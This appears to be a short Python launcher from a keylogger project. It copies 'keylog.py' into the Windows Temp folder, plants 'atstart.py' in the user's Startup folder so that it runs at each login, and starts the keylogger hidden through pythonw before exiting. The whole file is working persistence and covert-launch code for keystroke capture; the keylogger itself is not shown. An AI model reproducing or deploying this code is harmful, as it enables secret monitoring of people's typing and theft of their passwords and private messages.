import os
import shutil
import subprocess
import threading
import time

username= os.getlogin()
path=f"C:\\Users\\{username}\\AppData\\Local\\Temp\\keylog.py"

shutil.copy("keylog.py", path)
shutil.copy('atstart.py',f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")


def startkey():
    subprocess.call(f"pythonw .\\keylog.py")

if __name__ == "__main__":
    t= threading.Thread(target=startkey)
    t.start()
    # subprocess.call(f"pythonw .\\keylog.py")
    time.sleep(1)
    os._exit(0)